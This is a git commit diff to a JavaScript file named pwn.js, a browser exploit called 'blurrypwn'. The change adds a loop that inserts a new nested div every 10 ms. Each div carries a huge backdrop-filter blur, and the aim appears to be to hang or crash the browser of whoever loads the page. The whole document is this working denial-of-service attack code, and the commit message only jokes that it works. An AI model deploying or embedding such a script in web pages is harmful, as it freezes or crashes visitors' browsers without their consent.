af7f046df6ac0cd91deae944b9f84a1d6cdde8e4
0neGuy <0neguybusiness@gmail.com>
2019-05-03 12:09:38 +0200

    ooooo it worko very goodo
    it worko... nice-o

--- pwn.js
+++ pwn.js
@@ -1,12 +1,15 @@
 var pwn = {
     divI: 0,
     logging: true,
+    loop: null,
+    interval:10,
     start: function() {
         if (!document.getElementById("pwnStyling")) {
-            document.body.innerHTML += "<style id='pwnStyling'>.pwnDiv {backdrop-filter:blur(50px)}</style>";
+            document.body.innerHTML += "<style id='pwnStyling'>.pwnDiv {backdrop-filter: blur(10px);-webkit-backdrop-filter: blur(10px); width:90000px; height:90000px;}</style>";
             if (pwn.logging) {
                 console.log("%cblurrypwn: started exploit", "color:green")
             }
+            pwn.loop = setInterval(pwn.add, pwn.interval);
         } else {
             if (pwn.logging) {
                 console.log("%cblurrypwn: is already active", "color:red")
@@ -26,7 +29,7 @@ var pwn = {
                 console.log("%cblurrypwn: added new div", "color:green")
             }
             let morePwn = pwn.divI + 1;
-            eval('document.getElementById("' + pwn.divI + '").innerHTML += "<div class=pwnDiv id=" + morePwn + "></div>";')
+            eval('document.getElementById("' + pwn.divI + '").innerHTML += "<div class=pwnDiv id=" + morePwn + ">1</div>";')
             pwn.divI++;
         }
     },
@@ -40,6 +43,7 @@ var pwn = {
                 console.log("%cblurrypwn: stopped exploit", "color:green")
             }
             document.getElementById("pwnStyling").remove()
+            clearInterval(pwn.loop);
         }
     }
 }
